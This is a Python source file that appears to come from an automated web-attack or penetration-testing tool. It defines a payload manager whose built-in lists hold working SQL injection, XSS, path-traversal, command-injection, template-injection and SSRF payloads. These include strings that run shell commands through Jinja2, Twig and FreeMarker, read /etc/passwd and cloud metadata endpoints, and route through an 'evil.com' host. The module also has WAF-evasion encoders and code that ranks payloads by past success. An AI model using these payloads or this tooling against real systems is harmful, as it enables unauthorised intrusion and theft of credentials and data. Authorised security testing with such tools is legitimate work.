"""Payload management and intelligent loading."""

import os
import json
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional
from collections import Counter

from .logger import log_info, log_warning


@dataclass
class PayloadStats:
    """Statistics about payload usage."""
    total_loaded: int = 0
    total_used: int = 0
    successful: Counter = field(default_factory=Counter)
    failed: Counter = field(default_factory=Counter)


@dataclass
class PayloadCategory:
    """A category of payloads."""
    name: str
    payloads: list[str]
    description: str = ""
    tags: list[str] = field(default_factory=list)


class PayloadManager:
    """
    Manages payloads for various attack types.

    Features:
    - Load payloads from files or built-in collections
    - Context-aware payload selection
    - Success tracking for learning
    - WAF bypass payload variants
    """

    # Built-in payload collections
    BUILTIN_PAYLOADS = {
        "sqli": {
            "auth_bypass": [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "' OR 1=1--",
                "' OR 1=1#",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR 'x'='x",
                "' OR ''='",
                "1' OR '1'='1",
                "') OR ('1'='1",
                "') OR ('1'='1'--",
                "' OR 1=1 LIMIT 1--",
                "' OR 1=1 LIMIT 1#",
                "admin' OR '1'='1",
                "admin' OR '1'='1'--",
                "admin' OR '1'='1'#",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL--",
            ],
            "error_based": [
                "'",
                "\"",
                "\\",
                "1'",
                "1\"",
                "1'\"",
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
                "' UNION ALL SELECT NULL,NULL--",
                "0 UNION SELECT NULL--",
                "0 UNION SELECT NULL,NULL--",
            ],
            "time_based": [
                "' AND SLEEP(5)--",
                "' AND SLEEP(5)#",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND BENCHMARK(10000000,SHA1('test'))--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' AND SLEEP(5)--",
                "1') AND SLEEP(5)--",
                "' OR SLEEP(5)--",
            ],
            "boolean_based": [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1--",
                "' AND 1=2--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "' AND SUBSTRING(@@version,1,1)='5'--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
            ],
        },
        "xss": {
            "basic": [
                "<script>alert(1)</script>",
                "<script>alert('XSS')</script>",
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert(1)>",
                "<svg/onload=alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
            ],
            "attribute_escape": [
                "\" onmouseover=\"alert(1)",
                "' onmouseover='alert(1)",
                "\" onfocus=\"alert(1)\" autofocus=\"",
                "' onfocus='alert(1)' autofocus='",
                "\" onclick=\"alert(1)",
                "' onclick='alert(1)",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
            ],
            "javascript_context": [
                "</script><script>alert(1)</script>",
                "'-alert(1)-'",
                "\"-alert(1)-\"",
                "';alert(1);//",
                "\";alert(1);//",
                "\\';alert(1);//",
                "</script><img src=x onerror=alert(1)>",
            ],
            "polyglots": [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "'-alert(1)-'",
                "\"'-alert(1)-'\"",
                "<img src=x onerror=alert(1)//",
                "<svg/onload=alert(1)//",
            ],
            "filter_bypass": [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<img src=x onerror=alert`1`>",
                "<img src=x onerror=\\u0061lert(1)>",
                "<img src=x onerror=&#97;lert(1)>",
                "<img src=x onerror=al\\u0065rt(1)>",
            ],
        },
        "lfi": {
            "unix": [
                "../etc/passwd",
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "../../../../../../etc/passwd",
                "../../../../../../../etc/passwd",
                "/etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc/passwd",
                "..%252f..%252f..%252fetc/passwd",
            ],
            "windows": [
                "..\\..\\..\\..\\windows\\win.ini",
                "....\\\\....\\\\....\\\\windows\\win.ini",
                "C:\\windows\\win.ini",
                "C:/windows/win.ini",
                "..%5c..%5c..%5cwindows/win.ini",
            ],
            "php_wrappers": [
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/convert.base64-encode/resource=config.php",
                "php://filter/read=string.rot13/resource=index.php",
                "php://input",
                "data://text/plain,<?php phpinfo(); ?>",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "expect://id",
                "phar://test.phar",
            ],
            "encoding_bypass": [
                "....//....//....//etc/passwd",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
                "..%255c..%255c..%255cetc/passwd",
                "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "..%00/etc/passwd",
                "../etc/passwd%00",
                "../etc/passwd%00.jpg",
            ],
        },
        "cmdi": {
            "linux": [
                "; ls",
                "| ls",
                "|| ls",
                "& ls",
                "&& ls",
                "`ls`",
                "$(ls)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; id",
                "| id",
                "; whoami",
                "| whoami",
            ],
            "windows": [
                "& dir",
                "| dir",
                "; dir",
                "& type C:\\windows\\win.ini",
                "| type C:\\windows\\win.ini",
                "& whoami",
                "| whoami",
            ],
            "time_based": [
                "; sleep 5",
                "| sleep 5",
                "& sleep 5",
                "&& sleep 5",
                "|| sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "& ping -c 5 127.0.0.1 &",
                "| ping -c 5 127.0.0.1",
            ],
            "filter_bypass": [
                ";l$()s",
                ";l''s",
                ";l\"\"s",
                ";{ls,}",
                ";$'\\x6c\\x73'",
                ";/???/??t /???/p??s??",
            ],
        },
        "ssti": {
            "detection": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "*{7*7}",
                "@(7*7)",
                "{{7*'7'}}",
                "${7*'7'}",
            ],
            "jinja2": [
                "{{config}}",
                "{{config.items()}}",
                "{{self.__class__.__mro__}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ],
            "twig": [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
            ],
            "freemarker": [
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            ],
        },
        "ssrf": {
            "localhost": [
                "http://localhost",
                "http://127.0.0.1",
                "http://[::1]",
                "http://0.0.0.0",
                "http://127.1",
                "http://127.0.1",
            ],
            "cloud_metadata": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
            ],
            "bypass": [
                "http://localhost%23@evil.com",
                "http://localhost%2523@evil.com",
                "http://127.0.0.1.nip.io",
                "http://0x7f000001",
                "http://2130706433",
            ],
        },
    }

    # WAF bypass transformations
    WAF_BYPASS = {
        "case_variation": lambda p: p.swapcase(),
        "url_encode": lambda p: "".join(f"%{ord(c):02X}" for c in p),
        "double_url_encode": lambda p: "".join(f"%25{ord(c):02X}" for c in p),
        "unicode_encode": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
        "html_encode": lambda p: "".join(f"&#{ord(c)};" for c in p),
        "comment_injection": lambda p: p.replace(" ", "/**/") if "SELECT" in p.upper() else p,
    }

    def __init__(self, payloads_dir: Optional[Path] = None):
        """
        Initialize payload manager.

        Args:
            payloads_dir: Directory containing payload files
        """
        self.payloads_dir = payloads_dir
        self.stats = PayloadStats()
        self.success_cache: dict[str, list[str]] = {}  # attack_type -> successful payloads

    def load_payloads(
        self,
        attack_type: str,
        category: Optional[str] = None,
        db_type: Optional[str] = None,
    ) -> list[str]:
        """
        Load payloads for an attack type.

        Args:
            attack_type: sqli, xss, lfi, cmdi, ssti, ssrf
            category: Specific category within attack type
            db_type: Database type for SQLi (mysql, mssql, etc.)

        Returns:
            List of payloads
        """
        payloads = []

        # Try loading from file first
        if self.payloads_dir:
            file_payloads = self._load_from_files(attack_type, category, db_type)
            payloads.extend(file_payloads)

        # Fall back to built-in
        if not payloads:
            payloads = self._load_builtin(attack_type, category)

        self.stats.total_loaded += len(payloads)
        return payloads

    def _load_from_files(
        self,
        attack_type: str,
        category: Optional[str] = None,
        db_type: Optional[str] = None,
    ) -> list[str]:
        """Load payloads from files."""
        if not self.payloads_dir or not self.payloads_dir.exists():
            return []

        payloads = []
        base_path = self.payloads_dir / attack_type

        if not base_path.exists():
            return []

        # Determine which files to load
        if category:
            patterns = [f"{category}.txt", f"{category}.json"]
        elif db_type:
            patterns = [f"{db_type}/*.txt", f"{db_type}/*.json"]
        else:
            patterns = ["*.txt", "*.json", "**/*.txt", "**/*.json"]

        for pattern in patterns:
            for file_path in base_path.glob(pattern):
                try:
                    if file_path.suffix == ".json":
                        with open(file_path) as f:
                            data = json.load(f)
                            if isinstance(data, list):
                                payloads.extend(data)
                            elif isinstance(data, dict) and "payloads" in data:
                                payloads.extend(data["payloads"])
                    else:  # .txt
                        with open(file_path) as f:
                            payloads.extend(line.strip() for line in f if line.strip() and not line.startswith("#"))
                except Exception as e:
                    log_warning(f"Failed to load {file_path}: {e}")

        return payloads

    def _load_builtin(
        self,
        attack_type: str,
        category: Optional[str] = None,
    ) -> list[str]:
        """Load built-in payloads."""
        if attack_type not in self.BUILTIN_PAYLOADS:
            return []

        attack_payloads = self.BUILTIN_PAYLOADS[attack_type]

        if category and category in attack_payloads:
            return attack_payloads[category].copy()

        # Return all categories
        all_payloads = []
        for cat_payloads in attack_payloads.values():
            all_payloads.extend(cat_payloads)

        return all_payloads

    def get_smart_payloads(
        self,
        attack_type: str,
        context: Optional[str] = None,
        max_count: int = 100,
        prioritize_successful: bool = True,
    ) -> list[str]:
        """
        Get intelligently selected payloads.

        Args:
            attack_type: Type of attack
            context: Context hint (e.g., "html_attribute", "javascript")
            max_count: Maximum payloads to return
            prioritize_successful: Put previously successful payloads first

        Returns:
            Prioritized list of payloads
        """
        all_payloads = self.load_payloads(attack_type)

        # Filter by context if provided
        if context:
            if attack_type == "xss":
                context_map = {
                    "html_text": ["basic", "polyglots"],
                    "html_attribute": ["attribute_escape"],
                    "javascript": ["javascript_context"],
                }
                if context in context_map:
                    filtered = []
                    for cat in context_map[context]:
                        filtered.extend(self._load_builtin(attack_type, cat))
                    all_payloads = filtered if filtered else all_payloads

        # Prioritize successful payloads
        if prioritize_successful and attack_type in self.success_cache:
            successful = self.success_cache[attack_type]
            # Put successful at the front
            remaining = [p for p in all_payloads if p not in successful]
            all_payloads = successful + remaining

        return all_payloads[:max_count]

    def record_success(
        self,
        payload: str,
        attack_type: str,
        context: Optional[str] = None,
    ) -> None:
        """
        Record a successful payload for learning.

        Args:
            payload: The successful payload
            attack_type: Type of attack
            context: Context where it worked
        """
        self.stats.successful[payload] += 1

        if attack_type not in self.success_cache:
            self.success_cache[attack_type] = []

        if payload not in self.success_cache[attack_type]:
            self.success_cache[attack_type].append(payload)

        log_info(f"Recorded successful payload for {attack_type}")

    def record_failure(self, payload: str, attack_type: str) -> None:
        """Record a failed payload."""
        self.stats.failed[payload] += 1

    def generate_waf_bypass_variants(
        self,
        payload: str,
        techniques: Optional[list[str]] = None,
    ) -> list[str]:
        """
        Generate WAF bypass variants of a payload.

        Args:
            payload: Original payload
            techniques: Bypass techniques to use (None = all)

        Returns:
            List of variant payloads
        """
        if techniques is None:
            techniques = list(self.WAF_BYPASS.keys())

        variants = [payload]  # Include original

        for technique in techniques:
            if technique in self.WAF_BYPASS:
                try:
                    variant = self.WAF_BYPASS[technique](payload)
                    if variant != payload:
                        variants.append(variant)
                except Exception:
                    pass

        return variants

    def get_categories(self, attack_type: str) -> list[str]:
        """Get available categories for an attack type."""
        if attack_type in self.BUILTIN_PAYLOADS:
            return list(self.BUILTIN_PAYLOADS[attack_type].keys())
        return []

    def get_stats(self) -> dict:
        """Get payload usage statistics."""
        return {
            "total_loaded": self.stats.total_loaded,
            "total_used": self.stats.total_used,
            "top_successful": self.stats.successful.most_common(10),
            "top_failed": self.stats.failed.most_common(10),
        }

    def export_successful(self, filepath: Path) -> None:
        """Export successful payloads to file."""
        with open(filepath, "w") as f:
            json.dump(self.success_cache, f, indent=2)
        log_info(f"Exported successful payloads to {filepath}")

    def import_successful(self, filepath: Path) -> None:
        """Import previously successful payloads."""
        if filepath.exists():
            with open(filepath) as f:
                self.success_cache = json.load(f)
            log_info(f"Imported successful payloads from {filepath}")
